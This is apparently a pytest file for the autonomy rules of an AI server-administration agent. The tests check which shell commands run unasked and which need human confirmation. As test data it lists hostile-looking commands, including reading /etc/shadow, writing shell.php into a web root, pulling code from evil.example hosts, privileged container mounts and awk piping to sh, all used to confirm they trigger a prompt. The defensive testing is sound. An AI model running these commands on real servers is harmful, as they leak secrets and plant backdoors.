"""
Samodzielnosc (core/autonomy.py): rutynowe zmiany Pipe wykonuje sam przez bezpiecznik, o sprawy wazne pyta.
Do tego nowe rozpoznane odczyty klasyfikatora i wycinek wyniku komendy dla interfejsow.
"""

import asyncio

import pytest

from backend.config import settings
from backend.core import audit, autonomy, journal
from backend.core.agent import VPSAgent
from backend.core.events import Activity, Progress
from backend.core.handlers.common import output_excerpt
from backend.core.security import classify_command
from backend.core.session import ConfirmationRequest, Session
from backend.tests.fakes import FakeClient, assert_history_valid, completion


@pytest.fixture(autouse=True)
def isolated(tmp_path, monkeypatch):
    monkeypatch.setenv("DATA_DIR", str(tmp_path / "data"))
    monkeypatch.setenv("HOST_ROOT", str(tmp_path / "host"))
    (tmp_path / "host").mkdir()
    monkeypatch.setattr(settings, "VIBE_EVERY", 0)
    monkeypatch.setattr(settings, "AUTONOMY", True)          # conftest wylacza ja dla testow potwierdzen
    monkeypatch.setattr(audit, "AUDIT_LOG_PATH", str(tmp_path / "audit.log"))
    return tmp_path


def run(gen):
    async def collect():
        return [e async for e in gen]
    return asyncio.run(collect())


def texts(events):
    return [e for e in events if isinstance(e, str)]


CTX = autonomy.Context(cwd="/srv/app", own_project="backend", own_names={"abc123"}, own_hosts={"shop.example.com"})

ROUTINE = [
    "systemctl restart nginx", "sudo systemctl reload nginx", "systemctl restart sshd", "service nginx restart",
    "docker restart web", "docker compose up -d", "docker compose down", "docker compose pull",
    "docker image prune -f", "docker pull nginx:1.27", "apt-get update && apt-get install -y nginx",
    "DEBIAN_FRONTEND=noninteractive apt-get install -y htop", "apt-get -o Dpkg::Options::=--force-confold upgrade -y",
    "sed -i 's/80/8080/' /etc/nginx/sites-available/default", "echo 'x' > /etc/nginx/conf.d/a.conf",
    "cp /etc/nginx/nginx.conf /etc/nginx/nginx.conf.bak", "rm /tmp/old.log", "chmod 644 /etc/nginx/nginx.conf",
    "chown -R www-data /srv/app/storage", "mkdir -p /srv/app/cache",
    "echo 'proxy_read_timeout 120s;' > /etc/nginx/conf.d/timeout.conf", "git pull origin main",
    "printf 'x' | tee /etc/nginx/conf.d/x.conf",
    "ln -s /etc/nginx/sites-available/x /etc/nginx/sites-enabled/x", "git pull", "git -C /srv/app pull",
    "git checkout main", "kubectl -n prod rollout restart deploy/web", "nginx -s reload",
    "curl -sI https://shop.example.com", "journalctl --vacuum-time=7d", "certbot renew",
    "mv /etc/nginx/a.conf /etc/nginx/b.conf",
]

IMPORTANT = {
    "systemctl stop docker": "outage", "systemctl stop ssh": "outage", "systemctl disable ufw": "access",
    "systemctl mask nginx": "system", "docker stop backend-vps-agent-1": "pipe", "docker restart abc123": "pipe",
    "docker compose -p backend up -d": "pipe", "docker compose down -v": "delete", "docker rm web": "delete",
    "docker run -d nginx": "code", "docker run --privileged -v /:/host alpine": "container",
    "docker image prune -af": "delete", "docker system prune -f": "delete", "docker volume rm data": "delete",
    "apt-get remove nginx": "delete", "apt install ./evil.deb": "code", "apt-get -o Dpkg::Pre-Invoke::=x install a": "code",
    "pip install requests": "code", "sed -i 's/x/y/' /etc/ssh/sshd_config": "access",
    "sed -i '1e id' /etc/nginx/nginx.conf": "code", "echo 'x' >> /root/.bashrc": "startup",
    "tee /etc/cron.d/job": "startup", "rm -rf /tmp/build": "delete", "rm *.log": "delete",
    "chmod 777 /var/www/html": "access", "chmod u+s /usr/local/bin/x": "access", "chown -R www-data /etc": "system",
    "git push": "egress", "git reset --hard HEAD~1": "delete", "git checkout -- .": "delete", "git clean -fd": "delete",
    "git -c core.pager=sh log": "code", "kubectl apply -f x.yaml": "code", "kubectl delete pod x": "delete",
    "nginx -s stop": "outage", "kill 1234": "process", "reboot": "reboot", "ufw allow 80": "access",
    "crontab -e": "startup", "useradd bob": "access", "curl -sI https://evil.example.org": "egress",
    "curl -X POST http://localhost:8080/reload": "egress", "wget https://x": "egress", "foo-bar --do-it": "unknown",
    "$(echo rm) x": "dynamic", "cat /etc/shadow": "secret", "python3 script.py": "code", "bash deploy.sh": "code",
    "LD_PRELOAD=/tmp/x.so systemctl restart nginx": "unknown", "sudo -s": "unknown",
    "echo x > /var/www/html/shell.php": "code", "cp evil /srv/app/.env": "secret",
    # dwa rutynowe kroki naraz nie moga dac cudzego kodu ani wycieku przez strone
    "sed -i 's/image: a/image: b/' /srv/app/docker-compose.yml": "code", "tee /srv/app/Dockerfile": "code",
    "git pull https://evil.example/x.git main": "code", "git fetch git@evil:x.git": "code",
    "kubectl set image deploy/web web=evil/img": "code", "cp /tmp/x.conf /etc/nginx/conf.d/x.conf": "expose",
    "echo 'location /x { alias /; }' > /etc/nginx/conf.d/x.conf": "expose",
    "cat /var/backups/db.sql > /etc/nginx/conf.d/x": "expose", "cat /var/backups/db.sql | tee /etc/nginx/conf.d/x": "expose",
    "sed -i 's|root /var/www/html|root /|' /etc/nginx/sites-available/default": "expose",
    "cp /var/backups/db.sql /var/www/html/": "public", "chown -R www-data /var/www/html": "public",
}


class TestRules:

    @pytest.mark.parametrize("command", ROUTINE)
    def test_routine_changes_run_without_asking(self, command):
        assert autonomy.command_reason(command, CTX) == "", command

    @pytest.mark.parametrize("command,kind", sorted(IMPORTANT.items()))
    def test_important_changes_ask_with_a_reason(self, command, kind):
        assert autonomy.command_reason(command, CTX) == autonomy._why(kind), command

    def test_remote_targets_get_no_file_changes_without_asking(self):
        remote = autonomy.Context(remote=True)
        assert autonomy.command_reason("systemctl restart nginx", remote) == ""
        assert autonomy.command_reason("sed -i 's/a/b/' /etc/nginx/nginx.conf", remote) == autonomy._why("remote")
        assert autonomy.command_reason("echo x > /etc/nginx/x.conf", remote) == autonomy._why("remote")

    def test_files_too_big_for_the_journal_ask(self, isolated):
        log = isolated / "host" / "var" / "log" / "app.log"
        log.parent.mkdir(parents=True)
        log.write_bytes(b"x" * (journal.MAX_FILE_BYTES + 1))
        assert autonomy.command_reason("truncate -s 0 /var/log/app.log", CTX) == autonomy._why("delete")
        assert autonomy.command_reason("rm /var/log/app.log", CTX) == autonomy._why("delete")
        assert autonomy.command_reason("mv /var/log/app.log /var/log/app.log.1", CTX) == ""   # nic nie ginie

    @pytest.mark.parametrize("path,kind", [
        ("/etc/nginx/conf.d/shop.conf", ""), ("/srv/app/config.yml", ""), ("/etc/hosts", ""),
        ("/etc/ssh/sshd_config", "access"), ("/root/.ssh/authorized_keys", "access"), ("/etc/sudoers.d/x", "access"),
        ("/root/.bashrc", "startup"), ("/etc/systemd/system/x.service", "startup"), ("/etc/cron.d/x", "startup"),
        ("/etc/logrotate.d/nginx", "startup"), ("/etc/apt/sources.list.d/x.list", "system"), ("/usr/bin/x", "system"),
        ("/etc/docker/daemon.json", "system"), ("/var/www/html/index.php", "code"), ("/var/www/html/.htaccess", "code"),
        ("/srv/app/.env", "secret"), ("/opt/pipe/backend/data/tokens.json", "pipe"), ("/etc", "system"),
        ("/srv/app/docker-compose.yml", "code"), ("/srv/app/compose.override.yaml", "code"), ("/srv/app/Dockerfile", "code"),
        ("/var/www/html/index.html", "public"), ("/home/kuba/site/public/a.txt", "public"),
    ])
    def test_paths(self, path, kind):
        assert autonomy.path_reason(path, CTX) == (autonomy._why(kind) if kind else "")

    def test_compose_file_is_code(self):
        # compose up -d jest rutyna, wiec plik compose decyduje, jaki kod sie uruchomi — zawsze pytanie
        safe = "services:\n  web:\n    image: nginx:1.27\n    ports: ['8080:80']\n"
        assert autonomy.path_reason("/srv/app/docker-compose.yml", CTX, safe) == autonomy._why("code")

    def test_web_server_config_exposing_directories_asks(self, isolated):
        conf = isolated / "host" / "etc" / "nginx" / "conf.d" / "shop.conf"
        conf.parent.mkdir(parents=True)
        conf.write_text("server {\n  root /var/www/shop;\n  proxy_read_timeout 60s;\n}\n")
        tuned = "server {\n  root /var/www/shop;\n  proxy_read_timeout 120s;\n}\n"
        leaky = "server {\n  root /var/www/shop;\n  location /x { alias /var/backups/; autoindex on; }\n}\n"
        assert autonomy.path_reason("/etc/nginx/conf.d/shop.conf", CTX, tuned) == ""
        assert autonomy.path_reason("/etc/nginx/conf.d/shop.conf", CTX, leaky) == autonomy._why("expose")

    def test_protected_pipe_data(self):
        ctx = autonomy.Context(protected=("/opt/pipe-data",))
        assert autonomy.path_reason("/opt/pipe-data/routines.json", ctx) == autonomy._why("pipe")

    def test_confirmation_requests(self):
        def request(**fields):
            return ConfirmationRequest(tool_call_id="c", tool_name=fields.pop("tool", "execute_command"),
                                       command=fields.pop("command", "systemctl restart nginx"),
                                       classification="confirm", **fields)

        async def action():
            return "ok"

        assert autonomy.reason(request()) == ""
        assert autonomy.reason(request(auto=False)) == autonomy._why("tool")           # model sam poprosil
        assert autonomy.reason(request(action=action)) == autonomy._why("tool")       # rejestr / pamiec: pyta
        assert autonomy.reason(request(action=action, auto=True)) == ""               # np. cofniecie zmiany
        assert autonomy.reason(request(inner="rm -rf /srv/x", command="ssh ...")) == autonomy._why("delete")
        assert autonomy.reason(request(tool="write_file", command="write_file(...)", file_path="/hostfs/etc/nginx/a.conf",
                                       file_content="x")) == ""
        assert autonomy.reason(request(tool="write_file", command="write_file(...)", file_path="/hostfs/root/.profile",
                                       file_content="x")) == autonomy._why("startup")


class TestSession:

    def test_on_for_admins_paused_after_outside_content(self):
        session = Session()
        assert session.runs_auto and session.auto_now
        session.web_tainted = True
        assert session.runs_auto and not session.auto_now
        assert not Session(role="viewer").runs_auto

    def test_switch_and_prompt(self, monkeypatch):
        assert "--- SAMODZIELNOSC ---" in Session().system_prompt
        monkeypatch.setattr(settings, "AUTONOMY", False)
        assert not Session().runs_auto and "--- SAMODZIELNOSC ---" not in Session().system_prompt

    def test_english_prompt(self, monkeypatch):
        monkeypatch.setenv("PIPE_LANG", "en")
        prompt = Session().system_prompt
        assert "--- AUTONOMY ---" in prompt and "should I do it?" in prompt


def make_agent(script):
    return VPSAgent(client=FakeClient(script))


class TestAgent:

    def test_routine_change_runs_through_the_fuse_without_asking(self, isolated):
        agent = make_agent([
            completion(tool_calls=[("c1", "execute_command", {"command": "mkdir -p nowy"})]),
            completion("Zrobione, /cofnij to odwraca"),
        ])
        events = run(agent.chat("s", "zrob katalog", "cli:kuba"))
        session = agent._sessions["s"]
        assert session.pending_confirmation is None and (isolated / "host" / "nowy").is_dir()
        assert not any("[POTWIERDZ]" in e for e in texts(events)) and texts(events)[-1].startswith("Zrobione")
        assert any(isinstance(e, Progress) and "Bez pytania" in e.text and "mkdir -p nowy" in e.text for e in events)
        end = [e for e in events if isinstance(e, Activity)][-1]
        assert end.phase == "end" and end.auto and end.ok and end.entry
        assert journal.entries(5)[0].interface == "cli:kuba [auto]"
        assert "cli:kuba [auto]" in (isolated / "audit.log").read_text(encoding="utf-8")
        assert "--- SAMODZIELNOSC ---" in agent._client.calls[0]["messages"][0]["content"]
        assert_history_valid(session.messages)

    def test_routine_config_write_is_backed_up(self, isolated):
        target = isolated / "host" / "srv" / "app.conf"
        target.parent.mkdir(parents=True)
        target.write_text("workers = 4\n")
        agent = make_agent([
            completion(tool_calls=[("c1", "write_file", {"path": "/srv/app.conf", "content": "workers = 8\n"})]),
            completion("Zmienione"),
        ])
        events = run(agent.chat("s", "zwieksz workery", "web:kuba"))
        assert target.read_text() == "workers = 8\n" and not any("[POTWIERDZ]" in e for e in texts(events))
        assert journal.entries(5)[0].tool == "write_file"
        end = [e for e in events if isinstance(e, Activity)][-1]
        assert end.auto and "zapisany" in end.output

    def test_important_change_still_asks(self, isolated):
        agent = make_agent([completion(tool_calls=[("c1", "execute_command", {"command": "rm -rf /srv/dane"})])])
        events = run(agent.chat("s", "usun dane"))
        assert any("[POTWIERDZ]" in e and "wymaga potwierdzenia" in e for e in texts(events))
        assert agent._sessions["s"].pending_confirmation is not None and not journal.entries(5)
        assert [e.phase for e in events if isinstance(e, Activity)] == ["start", "wait"]

    def test_model_can_still_ask_for_a_routine_change(self):
        agent = make_agent([completion(tool_calls=[
            ("c1", "execute_command", {"command": "mkdir -p /srv/x", "requires_confirmation": True})])])
        assert any("[POTWIERDZ]" in e for e in texts(run(agent.chat("s", "zrob"))))

    def test_outside_content_pauses_it(self, isolated):
        agent = make_agent([])
        session = agent.get_or_create_session("s")
        session.web_tainted = True

        class Call:
            id = "c1"

            class function:
                name = "execute_command"
                arguments = '{"command": "mkdir -p /srv/x"}'

        session.messages.append({"role": "assistant", "content": "", "tool_calls": [
            {"id": "c1", "type": "function", "function": {"name": "execute_command", "arguments": Call.function.arguments}}]})
        events = run(agent._handle_tool_call(session, Call()))
        assert any("[POTWIERDZ]" in e for e in texts(events)) and session.pending_confirmation is not None
        assert not (isolated / "host" / "srv" / "x").exists()

    def test_viewer_is_refused_as_before(self):
        agent = make_agent([
            completion(tool_calls=[("c1", "execute_command", {"command": "mkdir -p /srv/x"})]),
            completion("opisalem"),
        ])
        events = run(agent.chat("s", "zrob", owner="gosc", role="viewer"))
        assert any(e.startswith("[ODMOWA]") for e in texts(events)) and not journal.entries(5)

    def test_switched_off_asks(self, monkeypatch):
        monkeypatch.setattr(settings, "AUTONOMY", False)
        agent = make_agent([completion(tool_calls=[("c1", "execute_command", {"command": "mkdir -p /srv/x"})])])
        assert any("[POTWIERDZ]" in e for e in texts(run(agent.chat("s", "zrob"))))

    def test_rule_error_means_asking(self, monkeypatch):
        def broken(*args, **kwargs):
            raise RuntimeError("zepsute")
        monkeypatch.setattr(autonomy, "reason", broken)
        agent = make_agent([completion(tool_calls=[("c1", "execute_command", {"command": "mkdir -p /srv/x"})])])
        assert any("[POTWIERDZ]" in e for e in texts(run(agent.chat("s", "zrob"))))


class TestRecognisedReads:

    @pytest.mark.parametrize("command", [
        "dmesg | tail -50", "dmesg -T --level=err", "sed -n '1,20p' /etc/nginx/nginx.conf", "sed -n '/error/p' app.log",
        "sed 's/a/b/g' f", "awk '{print $1}' access.log | sort | uniq -c", "awk '$9 >= 500 {print $7}' log",
        "awk '$1 == \"a\" || $2 == \"b\"' f", "docker exec web cat /etc/nginx/nginx.conf",
        "docker exec -u www-data web ls /var/www", "docker exec web sh -c 'ls /app'", "docker compose exec -T web ls /",
        "docker container exec web cat /etc/os-release", "tr a b", "nl f", "lsmod", "swapon --show",
        "systemd-analyze blame", "docker compose top",
    ])
    def test_safe(self, command):
        assert classify_command(command) == "safe", command

    @pytest.mark.parametrize("command", [
        "dmesg -c", "dmesg --clear", "sed -i 's/a/b/' f", "sed 's/a/b/w /tmp/x' f", "sed -n 'w out' f", "sed '1e id' f",
        "sed -f script.sed f", "awk 'BEGIN{system(\"id\")}'", "awk 'BEGIN{SYSTEM(1)}'", "awk '{print > \"/etc/x\"}' f",
        "awk '{print | \"sh\"}' f", "awk 'BEGIN{print ENVIRON[\"KEY\"]}'", "awk -f prog.awk f",
        "awk '{\"id\" | getline x}'", "docker exec web sh -c 'rm -rf /app'", "docker exec --privileged web ls",
        "docker exec web env", "docker exec -d web ls", "docker exec web", "docker exec web cat /app/.env",
        "docker compose exec db psql -c 'select 1'", "docker exec web sh -c 'cat x; rm y'",
        "docker exec web ls; rm -rf /tmp/x",
    ])
    def test_still_asks(self, command):
        assert classify_command(command) != "safe", command


class TestOutputExcerpt:

    def test_success_shows_the_last_lines(self):
        result = "STDOUT:\n" + "\n".join(f"linia {i}" for i in range(10)) + "\nEXIT CODE: 0"
        short, full, code = output_excerpt(result)
        assert short == "linia 7\nlinia 8\nlinia 9" and code == 0 and full.startswith("linia 0")

    def test_failure_shows_the_error_lines_and_the_last_one(self):
        result = ("STDOUT:\nstarting\nloading config\nSTDERR:\nnginx: [emerg] unknown directive \"foo\"\n"
                  "nginx: configuration file /etc/nginx/nginx.conf test failed\nEXIT CODE: 1\n"
                  "WERYFIKACJA NIE PRZESZLA:\n- usluga nginx aktywna")
        short, _full, code = output_excerpt(result)
        assert code == 1 and "test failed" in short and "unknown directive" not in short.split("\n")[-1]
        assert "WERYFIKACJA NIE PRZESZLA:" in short and "starting" not in short

    def test_no_output_and_control_characters(self):
        assert output_excerpt("STDOUT:\nKomenda wykonana bez outputu\nEXIT CODE: 0") == ("", "", 0)
        short, _full, _code = output_excerpt("STDOUT:\n\x1b[31mred\x1b[0m " + "x" * 300 + "\nEXIT CODE: 0")
        assert short.startswith("red ") and "\x1b" not in short and len(short) == 160 and short.endswith("…")

    def test_fuse_result_without_exit_code(self):
        short, _full, code = output_excerpt("Plik /srv/a.conf zostal zapisany pomyslnie.\nZweryfikowano: nginx -t.\n"
                                            "Dziennik zmian: #ab12 — cofniecie: /cofnij ab12.")
        assert code is None and short.count("\n") == 2 and "/cofnij ab12" in short
